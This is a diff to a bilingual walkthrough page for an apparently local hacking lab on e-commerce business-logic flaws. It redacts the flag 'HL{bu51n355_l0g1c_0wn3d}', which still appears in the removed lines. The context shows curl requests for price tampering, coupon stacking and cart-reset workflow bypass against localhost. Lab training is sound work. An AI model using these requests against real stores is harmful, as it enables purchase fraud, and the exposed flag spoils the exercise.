@@ -166,7 +166,7 @@
   -d "product_id=1&amp;price=1&amp;qty=1"</pre>
       </li>
       <li>Establece <code>price=1</code> (1 céntimo). Con balance de $1.00, el checkout funciona.</li>
-      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+      <li>Flag: <code>HL{···}</code></li>
     </ol>
 
     <h3>Medium — Cantidad negativa o coupon stacking</h3>
@@ -182,7 +182,7 @@
 curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
 curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"</pre>
       </li>
-      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+      <li>Flag: <code>HL{···}</code></li>
     </ol>
 
     <h3>Hard — Workflow bypass</h3>
@@ -197,7 +197,7 @@ curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"</pre>
       <li>Encadena: limpia el carrito entre requests para resetear el estado y probar distintos vectores:
         <pre>curl -X POST http://localhost:5000/shop/cart/clear -b "session=SESS"</pre>
       </li>
-      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+      <li>Flag: <code>HL{···}</code></li>
     </ol>
 
     <h3>Herramientas</h3>
@@ -214,7 +214,7 @@ curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"</pre>
   -d "product_id=1&amp;price=1&amp;qty=1"</pre>
       </li>
       <li>Set <code>price=1</code> (1 cent). With a $1.00 balance, checkout succeeds.</li>
-      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+      <li>Flag: <code>HL{···}</code></li>
     </ol>
 
     <h3>Medium — Negative quantity or coupon stacking</h3>
@@ -230,7 +230,7 @@ curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"</pre>
 curl -X POST http://localhost:5000/shop/coupon -b "session=SESS" -d "code=LABS50"
 curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"</pre>
       </li>
-      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+      <li>Flag: <code>HL{···}</code></li>
     </ol>
 
     <h3>Hard — Workflow bypass</h3>
@@ -245,7 +245,7 @@ curl -X POST http://localhost:5000/shop/checkout -b "session=SESS"</pre>
       <li>Chain: clear the cart between requests to reset state and test different vectors:
         <pre>curl -X POST http://localhost:5000/shop/cart/clear -b "session=SESS"</pre>
       </li>
-      <li>Flag: <code>HL{bu51n355_l0g1c_0wn3d}</code></li>
+      <li>Flag: <code>HL{···}</code></li>
     </ol>
 
     <h3>Tools</h3>
